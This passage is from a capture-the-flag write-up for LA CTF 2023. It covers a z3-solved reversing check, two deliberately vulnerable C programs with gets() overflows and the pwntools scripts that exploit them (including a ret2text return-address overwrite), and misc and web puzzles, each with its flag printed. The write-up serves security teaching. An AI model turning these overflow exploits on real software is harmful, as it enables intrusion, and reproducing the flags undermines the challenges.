(((bytes[34] ^ (bytes[22] * 7)) ^ ((bytes[35] ^ (-1)) + 13)) & 255) == 84 && (((bytes[36] ^ (bytes[16] * 7)) ^ ((bytes[4] ^ (-1)) + 13)) & 255) == 75 && (((bytes[8] ^ (bytes[3] * 7)) ^ ((bytes[10] ^ (-1)) + 13)) & 255) == 214 && (((bytes[20] ^ (bytes[5] * 7)) ^ ((bytes[12] ^ (-1)) + 13)) & 255) == 193 && (((bytes[28] ^ (bytes[34] * 7)) ^ ((bytes[16] ^ (-1)) + 13)) & 255) == 210 && (((bytes[3] ^ (bytes[35] * 7)) ^ ((bytes[9] ^ (-1)) + 13)) & 255) == 205 && (((bytes[27] ^ (bytes[22] * 7)) ^ ((bytes[2] ^ (-1)) + 13)) & 255) == 46 && (((bytes[27] ^ (bytes[18] * 7)) ^ ((bytes[9] ^ (-1)) + 13)) & 255) == 54 && (((bytes[3] ^ (bytes[29] * 7)) ^ ((bytes[22] ^ (-1)) + 13)) & 255) == 32 && (((bytes[24] ^ (bytes[4] * 7)) ^ ((bytes[13] ^ (-1)) + 13)) & 255) == 99 && (((bytes[22] ^ (bytes[16] * 7)) ^ ((bytes[13] ^ (-1)) + 13)) & 255) == 108 && (((bytes[12] ^ (bytes[8] * 7)) ^ ((bytes[30] ^ (-1)) + 13)) & 255) == 117 && (((bytes[25] ^ (bytes[27] * 7)) ^ ((bytes[35] ^ (-1)) + 13)) & 255) == 146 && (((bytes[16] ^ (bytes[10] * 7)) ^ ((bytes[14] ^ (-1)) + 13)) & 255) == 250 && (((bytes[21] ^ (bytes[25] * 7)) ^ ((bytes[12] ^ (-1)) + 13)) & 255) == 195 && (((bytes[26] ^ (bytes[10] * 7)) ^ ((bytes[30] ^ (-1)) + 13)) & 255) == 203 && (((bytes[20] ^ (bytes[2] * 7)) ^ ((bytes[1] ^ (-1)) + 13)) & 255) == 47 && (((bytes[34] ^ (bytes[12] * 7)) ^ ((bytes[27] ^ (-1)) + 13)) & 255) == 121 && (((bytes[19] ^ (bytes[34] * 7)) ^ ((bytes[20] ^ (-1)) + 13)) & 255) == 246 && (((bytes[25] ^ (bytes[22] * 7)) ^ ((bytes[14] ^ (-1)) + 13)) & 255) == 61 && (((bytes[19] ^ (bytes[28] * 7)) ^ ((bytes[37] ^ (-1)) + 13)) & 255) == 189 && (((bytes[24] ^ (bytes[9] * 7)) ^ ((bytes[17] ^ (-1)) + 13)) & 255) == 185) {
            System.out.println("Correct!");
        } else {
            System.out.println("Not quite...");
        }
    }
}
```

#### Solution:
```py
from z3 import *
a = [BitVec(f'a_{i}',8) for i in range(38)]
s = Solver()
s.add([(((a[34] ^ (a[23] * 7)) ^ ((a[36] ^ (-1)) + 13)) & 255) == 182 ,
 (((a[37] ^ (a[10] * 7)) ^ ((a[21] ^ (-1)) + 13)) & 255) == 223 ,
 (((a[24] ^ (a[23] * 7)) ^ ((a[19] ^ (-1)) + 13)) & 255) == 205 ,
 (((a[25] ^ (a[13] * 7)) ^ ((a[23] ^ (-1)) + 13)) & 255) == 144 ,
 (((a[6] ^ (a[27] * 7)) ^ ((a[25] ^ (-1)) + 13)) & 255) == 138 ,
 (((a[4] ^ (a[32] * 7)) ^ ((a[22] ^ (-1)) + 13)) & 255) == 227 ,
 (((a[25] ^ (a[19] * 7)) ^ ((a[1] ^ (-1)) + 13)) & 255) == 107 ,
 (((a[22] ^ (a[7] * 7)) ^ ((a[29] ^ (-1)) + 13)) & 255) == 85 ,
 (((a[15] ^ (a[10] * 7)) ^ ((a[20] ^ (-1)) + 13)) & 255) == 188 ,
 (((a[29] ^ (a[16] * 7)) ^ ((a[12] ^ (-1)) + 13)) & 255) == 88 ,
 (((a[35] ^ (a[4] * 7)) ^ ((a[33] ^ (-1)) + 13)) & 255) == 84 ,
 (((a[36] ^ (a[2] * 7)) ^ ((a[4] ^ (-1)) + 13)) & 255) == 103 ,
 (((a[26] ^ (a[3] * 7)) ^ ((a[1] ^ (-1)) + 13)) & 255) == 216 ,
 (((a[12] ^ (a[6] * 7)) ^ ((a[18] ^ (-1)) + 13)) & 255) == 165 ,
 (((a[12] ^ (a[28] * 7)) ^ ((a[36] ^ (-1)) + 13)) & 255) == 151 ,
 (((a[20] ^ (a[0] * 7)) ^ ((a[21] ^ (-1)) + 13)) & 255) == 101 ,
 (((a[27] ^ (a[36] * 7)) ^ ((a[14] ^ (-1)) + 13)) & 255) == 248 ,
 (((a[35] ^ (a[2] * 7)) ^ ((a[19] ^ (-1)) + 13)) & 255) == 44 ,
 (((a[13] ^ (a[11] * 7)) ^ ((a[33] ^ (-1)) + 13)) & 255) == 242 ,
 (((a[33] ^ (a[11] * 7)) ^ ((a[3] ^ (-1)) + 13)) & 255) == 235 ,
 (((a[31] ^ (a[37] * 7)) ^ ((a[29] ^ (-1)) + 13)) & 255) == 248 ,
 (((a[1] ^ (a[33] * 7)) ^ ((a[31] ^ (-1)) + 13)) & 255) == 33 ,
 (((a[34] ^ (a[22] * 7)) ^ ((a[35] ^ (-1)) + 13)) & 255) == 84 ,
 (((a[36] ^ (a[16] * 7)) ^ ((a[4] ^ (-1)) + 13)) & 255) == 75 ,
 (((a[8] ^ (a[3] * 7)) ^ ((a[10] ^ (-1)) + 13)) & 255) == 214 ,
 (((a[20] ^ (a[5] * 7)) ^ ((a[12] ^ (-1)) + 13)) & 255) == 193 ,
 (((a[28] ^ (a[34] * 7)) ^ ((a[16] ^ (-1)) + 13)) & 255) == 210 ,
 (((a[3] ^ (a[35] * 7)) ^ ((a[9] ^ (-1)) + 13)) & 255) == 205 ,
 (((a[27] ^ (a[22] * 7)) ^ ((a[2] ^ (-1)) + 13)) & 255) == 46 ,
 (((a[27] ^ (a[18] * 7)) ^ ((a[9] ^ (-1)) + 13)) & 255) == 54 ,
 (((a[3] ^ (a[29] * 7)) ^ ((a[22] ^ (-1)) + 13)) & 255) == 32 ,
 (((a[24] ^ (a[4] * 7)) ^ ((a[13] ^ (-1)) + 13)) & 255) == 99 ,
 (((a[22] ^ (a[16] * 7)) ^ ((a[13] ^ (-1)) + 13)) & 255) == 108 ,
 (((a[12] ^ (a[8] * 7)) ^ ((a[30] ^ (-1)) + 13)) & 255) == 117 ,
 (((a[25] ^ (a[27] * 7)) ^ ((a[35] ^ (-1)) + 13)) & 255) == 146 ,
 (((a[16] ^ (a[10] * 7)) ^ ((a[14] ^ (-1)) + 13)) & 255) == 250 ,
 (((a[21] ^ (a[25] * 7)) ^ ((a[12] ^ (-1)) + 13)) & 255) == 195 ,
 (((a[26] ^ (a[10] * 7)) ^ ((a[30] ^ (-1)) + 13)) & 255) == 203 ,
 (((a[20] ^ (a[2] * 7)) ^ ((a[1] ^ (-1)) + 13)) & 255) == 47 ,
 (((a[34] ^ (a[12] * 7)) ^ ((a[27] ^ (-1)) + 13)) & 255) == 121 ,
 (((a[19] ^ (a[34] * 7)) ^ ((a[20] ^ (-1)) + 13)) & 255) == 246 ,
 (((a[25] ^ (a[22] * 7)) ^ ((a[14] ^ (-1)) + 13)) & 255) == 61 ,
 (((a[19] ^ (a[28] * 7)) ^ ((a[37] ^ (-1)) + 13)) & 255) == 189 ,
 (((a[24] ^ (a[9] * 7)) ^ ((a[17] ^ (-1)) + 13)) & 255) == 185])
flag = bytearray(38)
if s.check():
    res = s.model()
    for i in range(38):
        flag[i] = res.eval(a[i]).as_long()
    print(flag.decode())

# lactf{1_d0nt_see_3_b1ll10n_s0lv3s_y3t}
```
## Pwn

### gatekeep
#### Challenge:
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>

void print_flag() {
    char flag[256];

    FILE* flagfile = fopen("flag.txt", "r");
    
    if (flagfile == NULL) {
        puts("Cannot read flag.txt.");
    } else {
        fgets(flag, 256, flagfile);
        flag[strcspn(flag, "\n")] = '\0';
        puts(flag);
    }
}

int check(){
    char input[15];
    char pass[10];
    int access = 0;

    // If my password is random, I can gatekeep my flag! :)
    int data = open("/dev/urandom", O_RDONLY);
    if (data < 0)
    {
        printf("Can't access /dev/urandom.\n");
        exit(1);
    }
    else
    {
        ssize_t result = read(data, pass, sizeof pass);
        if (result < 0)
        {
            printf("Data not received from /dev/urandom\n");
            exit(1);
        }
    }
    close(data);
    
    printf("Password:\n");
    gets(input);

    if(strcmp(input, pass)) {
        printf("I swore that was the right password ...\n");
    }
    else {
        access = 1;
    }

    if(access) {
        printf("Guess I couldn't gaslight you!\n");
        print_flag();
    }
}

int main(){
    setbuf(stdout, NULL);
    printf("If I gaslight you enough, you won't be able to guess my password! :)\n");
    check();
    return 0;
}
```
#### Solution:
```py
from pwn import *
p = remote('lac.tf',31121)
p.recvuntil(b'Password:')
p.sendline(b'a'*30)
p.interactive()
```
### bot
#### Challenge:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(void) {
  setbuf(stdout, NULL);
  char input[64];
  volatile int give_flag = 0;
  puts("hi, how can i help?");
  gets(input);
  if (strcmp(input, "give me the flag") == 0) {
    puts("lol no");
  } else if (strcmp(input, "please give me the flag") == 0) {
    puts("no");
  } else if (strcmp(input, "help, i have no idea how to solve this") == 0) {
    puts("L");
  } else if (strcmp(input, "may i have the flag?") == 0) {
    puts("not with that attitude");
  } else if (strcmp(input, "please please please give me the flag") == 0) {
    puts("i'll consider it");
    sleep(15);
    if (give_flag) {
      puts("ok here's your flag");
      system("cat flag.txt");
    } else {
      puts("no");
    }
  } else {
    puts("sorry, i didn't understand your question");
    exit(1);
  }
}

```
#### Solution:
Simple ret2text. Use `'\0'` to bypass `strcmp()` and get the address of `give_flag` branch using IDA(graph mode). The length of payload is the size of all stack variables plus 4(to reach `rip`). The following exploit script can be constructed:
```py
from pwn import *
# context(log_level='debug',os='linux',arch='amd64')
payload = b'please please please give me the flag\0'.ljust(64+4+4,b'a')+p64(0x40128E)
p = remote('lac.tf',31180)
p.sendline(payload)
p.interactive()

# lactf{hey_stop_bullying_my_bot_thats_not_nice}
```
## Misc

### CATS!
#### Challenge:
[CATS.jpeg](https://github.com/uclaacm/lactf-archive/blob/master/2023/misc/cats/CATS.jpeg)
#### Solution:
Just find the GPS infomation in the photo's EXIF and search by google map
```
lactf{lanaicatsanctuary.org}
```
### hidden in plain sheets
#### Challenge:
[Link 1](https://docs.google.com/spreadsheets/d/1OYx3lCccLKYgOvzxkRZ5-vAwCn3mOvGUvB4AdnSbcZ4/edit) [Link 2](https://docs.google.com/spreadsheets/d/17A1f0z8rmR7356fcHmHTHt3Y0JMgcHlGoflADtNXeOU/edit) [Link 3](https://docs.google.com/spreadsheets/d/1ULdm_KCOYCWuf6gqpg6tm0t-wnWySX_Bf3yUYOfZ2tw/edit)
#### Solution:
I used Edit->Find and replace->Find .* & Search using regular expressions enabled & Specific range: flag!A1 ~ flag!AR1 to get the flag character by character.
`lactf{H1dd3n_&_prOt3cT3D_5h33T5_Ar3_n31th3r}`

### EBE
#### Challenge:
[EBE.pcap](https://github.com/uclaacm/lactf-archive/blob/master/2023/misc/ebe/EBE.pcap)
#### Solution:
By reading RFC 3514, we know the reversed byte in ip.flags shows whether a packet is modified.
So we use the filter: ip.flags==0 in wireshark and export them into a new file, track the UDP byte stream and get the flag.
`lactf{3V1L_817_3xf1l7R4710N_4_7H3_W1N_51D43c8000034d0c}`

## Web

### college-tour
#### Challenge:
[college-tour.lac.tf](https://college-tour.lac.tf/)
#### Solution:
F12 to view the source code:
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <title>A tour of UCLA</title>
    <link rel="stylesheet" href="index.css">
    <script src="script.js"></script>
</head>
<body>
    <h1>A tour of UCLA</h1>
    <button id="dark_mode_button" onclick="dark_mode()">Click me for Light Mode!</button>
    <p> After finally setting foot on UCLA's campus, you're excited to explore it. However, the new student advisors have hidden <b>six</b> clues in the format lactf{number_text} all across UCLA. To complete the scavenger hunt, you must merge all the parts into one in order. For example, if you find the clues lactf{1_lOsT}, lactf{2__!N_b} (note the repeated underscore), and lactf{3_03LT3r}, the answer is lactf{lOsT_!N_b03LT3r}. Have fun exploring!</p>
    <!-- lactf{1_j03_4}-->
    <img src="royce.jpg" alt="lactf{2_nd_j0}" height="400px">
    <iframe src="lactf{4_n3_bR}.pdf" width="100%" height="500px">
    </iframe>
</body>
````
we get three part:`lactf{1_j03_4}` `lactf{2_nd_j0}` `lactf{4_n3_bR}`.
View `script.js` and `index.css`:
```js
let dark = 1;

function dark_mode() {
    dark = 1 - dark;
    var element = document.body;
    element.classList.toggle("dark-mode");
    if (dark === 1) {
        document.getElementById("dark_mode_button").textContent = "Click me for Light Mode!";
    }
    else if (dark === 0) {
        document.getElementById("dark_mode_button").textContent = "Click me for Dark Mode!";
    }
    else {
        document.getElementById("dark_mode_button").textContent = "Click me for lactf{6_AY_hi} Mode!";
    }
}

window.addEventListener("load", (event) => {
    document.cookie = "cookie=lactf{5_U1n_s}";
});
```
```css
@import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;700&family=Poppins:wght@400;700&display=swap');

body {
	font-family: 'Open Sans', sans-serif;
	color: white;
	background-color: #242424;
	margin: 0 auto;
	padding: 2rem;
	max-width: 768px;
}

.dark-mode {
    background-color: white;
    color: black;
}

.secret {
    font-family: "lactf{3_S3phI}"
}

h1, h2, h3 {
	font-family: 'Poppins', sans-serif;
	color: #ffba44;
}

h2 {
	margin: 0.3rem 0;
	font-size: 1.2rem;
}

h3 {
	margin: 0.2rem 0;
	font-size: 1rem;
}

a {
	color: #ffba44;
	text-decoration: none;
}

a:hover {
	opacity: .8;
	transition: .5s;
}

p {
	line-height: 1.5rem;
	font-size: 0.9rem;
}

button {
    border-radius: 0px;
    background-color: #4CAF50; /* Green */
    border: none;
    color: white;
    padding: 15px 32px;
    text-align: center;
    text-decoration: none;
    display: inline-block;
    font-size: 16px;
}
```
we get 3 more parts:`lactf{5_U1n_s}`  `lactf{6_AY_hi}`  `lactf{3_S3phI}`

Put them together:`lactf{j03_4nd_j0S3phIn3_bRU1n_sAY_hi}`